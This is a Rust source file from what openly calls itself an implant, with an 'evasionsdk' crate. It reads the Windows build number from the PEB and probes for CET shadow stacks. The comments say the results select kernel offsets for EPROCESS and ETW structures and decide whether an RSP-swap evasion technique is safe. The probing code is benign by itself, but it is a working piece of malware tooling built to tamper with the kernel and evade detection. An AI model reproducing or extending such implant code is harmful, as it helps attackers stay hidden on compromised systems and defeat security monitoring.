//! Cross-version runtime detection — build number + CET probe.
//!
//! These probes let the implant select the right kernel offsets at runtime
//! (when none were compile-time baked via NYX_OFFSETS) and decide whether
//! CET-sensitive techniques (RSP swap) are safe.
//!
//! ## PEB layout stability
//! All probes read the x64 PEB via `gs:[0x60]`. The PEB field layout is frozen
//! by the x64 ABI across all Win10/11/Server builds:
//! - `OSBuildNumber` — USHORT at PEB + 0x120 (stable since Win7 x64)
//! - `OSCSDVersion` — USHORT at PEB + 0x122 (the service-pack level)
//! - `OSMajorVersion` / `OSMinorVersion` — ULONG at PEB + 0x118 / 0x11C
//!
//! These DO NOT drift across builds — only the KERNEL structures (EPROCESS,
//! ETW GUID entry) drift, and those are resolved via the offsets table keyed
//! by the build number read here.

#![cfg(target_os = "windows")]

use core::sync::atomic::{AtomicU32, AtomicU8, Ordering};

/// Cached OS build number (0 = not yet probed).
static BUILD_NUMBER: AtomicU32 = AtomicU32::new(0);

/// Cached CET-on flag (2 = not yet probed, 0 = off, 1 = on).
static CET_PROBED: AtomicU8 = AtomicU8::new(2);

/// Read the Windows build number from the PEB (OSBuildNumber @ +0x120).
/// Cached after the first call. Returns 0 if the PEB is unreadable (shouldn't
/// happen in a real process). This is the key into the offsets table.
pub fn build_number() -> u32 {
    let cached = BUILD_NUMBER.load(Ordering::Acquire);
    if cached != 0 {
        return cached;
    }
    let n = unsafe { read_build_number_raw() };
    if n != 0 {
        BUILD_NUMBER.store(n, Ordering::Release);
    }
    n
}

/// Read OSBuildNumber directly from the PEB (no caching).
///
/// # Safety
/// Reads PEB+0x120 via gs:[0x60]. Stable post-load, single-threaded context.
unsafe fn read_build_number_raw() -> u32 {
    let peb = match crate::resolve::peb_pointer() {
        Some(p) => p,
        None => return 0,
    };
    // OSBuildNumber is a USHORT at PEB + 0x120 on x64.
    let build = unsafe { core::ptr::read_unaligned((peb as usize + 0x120) as *const u16) };
    build as u32
}

/// Is user-mode CET (shadow stack) active for this process?
///
/// Probes via `kernel32!IsProcessorFeaturePresent(PF_SMET_CET_SHADOW_STACKS_ENABLED = 41)`.
/// On Win10 / Server 2019, that export doesn't know about feature 41 → returns
/// FALSE (CET off, correct). On Win11 24H2+, if the process opted into CET,
/// it returns TRUE.
///
/// Cached after the first call. Defaults to FALSE (off) if the export can't be
/// resolved — which is correct for all pre-24H2 builds.
pub fn cet_active() -> bool {
    let cached = CET_PROBED.load(Ordering::Acquire);
    if cached != 2 {
        return cached == 1;
    }
    let on = probe_cet();
    CET_PROBED.store(on as u8, Ordering::Release);
    on
}

/// The raw CET probe. Resolves IsProcessorFeaturePresent and queries feature 41.
fn probe_cet() -> bool {
    // PF_SMET_CET_SHADOW_STACKS_ENABLED = 41 (Win11 24H2+).
    const PF_CET: u32 = 41;
    type IsProcessorFeaturePresent = unsafe extern "system" fn(u32) -> i32;
    let addr =
        match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"IsProcessorFeaturePresent") }
        {
            Some(a) => a,
            None => return false, // export missing → CET unsupported → off
        };
    let f: IsProcessorFeaturePresent = unsafe { core::mem::transmute(addr) };
    // SAFETY: IsProcessorFeaturePresent is a pure query (no side effects).
    unsafe { f(PF_CET) != 0 }
}

/// Look up the kernel offsets for the current host's build. Convenience wrapper
/// over `offsets_table::for_build(build_number())`. Returns None if the build
/// is unknown (caller degrades or pattern-scans).
pub fn host_offsets() -> Option<&'static nyx_implant_evasionsdk::offsets_table::BuildOffsets> {
    nyx_implant_evasionsdk::offsets_table::for_build(build_number())
}

/// A human-readable version string for diagnostics/selftests (e.g. "17763 CET=off").
pub fn version_str() -> alloc::string::String {
    let build = build_number();
    let cet = if cet_active() { "on" } else { "off" };
    let mut s = alloc::string::String::new();
    // Manual formatting (no format! under no_std).
    s.push_str("build=");
    s.push_str(&dec_u32(build));
    s.push_str(" CET=");
    s.push_str(cet);
    s
}

fn dec_u32(mut v: u32) -> alloc::string::String {
    if v == 0 {
        return alloc::string::String::from("0");
    }
    let mut tmp = [0u8; 10];
    let mut i = tmp.len();
    while v != 0 {
        i -= 1;
        tmp[i] = b'0' + (v % 10) as u8;
        v /= 10;
    }
    let mut s = alloc::string::String::new();
    for &b in &tmp[i..] {
        s.push(b as char);
    }
    s
}
